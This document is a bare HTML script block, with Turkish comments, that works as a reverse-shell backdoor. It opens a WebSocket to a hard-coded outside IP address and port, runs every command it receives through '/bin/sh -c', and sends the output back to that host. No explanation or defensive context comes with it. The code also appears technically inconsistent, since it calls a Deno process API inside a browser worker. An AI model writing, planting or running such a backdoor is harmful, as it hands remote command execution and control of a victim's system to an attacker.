<script>
    var port = 4545; // Bağlantı kurulacak port numarası
    var host = '31.172.87.6'; // Bağlantı kurulacak IP adresi

    var s = new WebSocket('ws://' + host + ':' + port);

    s.onopen = function () {
        s.send('Bağlantı başarılı. Merhaba!');
    };

    s.onmessage = function (e) {
        var command = e.data;
        var child = new Worker(URL.createObjectURL(new Blob([`
            var cmd = '` + command + `';
            var p = Deno.run({
                cmd: ['/bin/sh', '-c', cmd],
                stdout: 'piped',
                stderr: 'piped',
                stdin: 'piped'
            });
            var stdout = new TextDecoder().decode(await p.output());
            var stderr = new TextDecoder().decode(await p.stderrOutput());
            var output = stdout + '\\n' + stderr;
            postMessage(output);
        `])));
        child.onmessage = function (e) {
            s.send(e.data);
        };
    };
</script>
